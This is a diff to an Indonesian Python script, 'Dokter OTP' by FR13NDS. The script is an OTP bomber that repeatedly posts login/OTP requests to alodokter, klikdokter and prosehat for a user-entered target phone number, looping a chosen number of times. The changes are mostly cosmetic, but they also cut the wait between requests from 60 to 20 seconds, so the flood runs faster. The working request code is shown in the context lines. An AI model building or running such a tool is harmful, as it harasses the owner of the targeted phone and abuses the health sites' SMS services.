@@ -24,7 +24,7 @@ class docter:
 		req2=self.ses.post('https://www.alodokter.com/login-with-phone-number',headers=head,json={"user":{"phone":num}})
 #		print(req2.json())
 		if req2.json()['status'] == 'success':
-			print("[•] Berhasil")
+			print("[√] Berhasil")
 		else:
 			print("[-] Gagal")
 
@@ -56,7 +56,7 @@ class docter:
 		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
 #		print(req2.url)
 		if "sessions/auth?user=" in req2.url:
-			print("[•] Berhasil")
+			print("[√] Berhasil")
 		else:
 			print("[-] Gagal")
 
@@ -74,15 +74,15 @@ class docter:
 		req=requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=ata,headers=head)
 #		print(req.text)
 		if "token" in req.text:
-			print("[•] Berhasil")
-			for x in range(60):
-				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
+			print("[√] Berhasil")
+			for x in range(20):
+				print(end=f"\r>> Sleep {20-(x+1)}s << ",flush=True)
 				time.sleep(1)
 			print()
 		else:
 			print(f"[-] Gagal {req.text}")
-			for x in range(60):
-				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
+			for x in range(20):
+				print(end=f"\r>> Sleep {20-(x+1)}s << ",flush=True)
 				time.sleep(1)
 			print()
 
@@ -120,12 +120,10 @@ while True:
                █ github:FR13NDS666      █
                █ whatsapp:085770555837  █
               "___________________________"
-                             
-      
-                                                      
-                 [ Dokter OTP ]
-              	 - By FR13NDS -
-               'Jangan di recode'
+                                                                           
+                     [ Dokter OTP ]
+              	     - By FR13NDS -
+                   'Jangan di recode'
  ▇▇▇▇▇ 
 ┊ ▇▇▇▇▇
 ┊ ▇▇▇▇▇
@@ -144,8 +142,8 @@ while True:
 	""")
 		pil=int(input("> Pilih: "))
 		print("="*25)
-		num=input("[?] Nomor Target: ")
-		lop=int(input("[?] Looping: "))
+		num=input("[•] Nomor Target: ")
+		lop=int(input("[•] jumlah: "))
 		print()
 
 		main=docter()
@@ -163,6 +161,6 @@ while True:
 
 		lgi=input("\n[?] Coba lagi (Y/n) ")
 		if lgi.lower() == 'n':
-			sys.exit('GOODBYE :*')
+			sys.exit('GOODBYE SAYANG :*')
 	except Exception as Err:
 		sys.exit(Err)
